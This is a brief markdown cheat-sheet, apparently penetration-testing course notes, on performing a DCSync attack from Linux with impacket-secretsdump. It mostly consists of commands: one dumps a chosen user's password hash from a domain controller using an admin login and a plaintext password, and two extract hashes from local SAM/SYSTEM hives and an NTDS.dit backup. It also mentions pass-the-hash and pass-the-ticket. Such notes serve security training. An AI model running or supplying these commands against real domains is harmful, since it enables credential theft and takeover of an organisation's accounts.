dcsync attack from Linux
can use pass-the-hash and pas-the-ticket
```bash
# target username **dave**
$ impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70

# user to log into DC to get info about "dave" domain/user:password@ip
```
```bash
# Get hashes from local files
impacket-secretsdump -sam ./SAM -system ./SYSTEM LOCAL
```
```bash
$ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```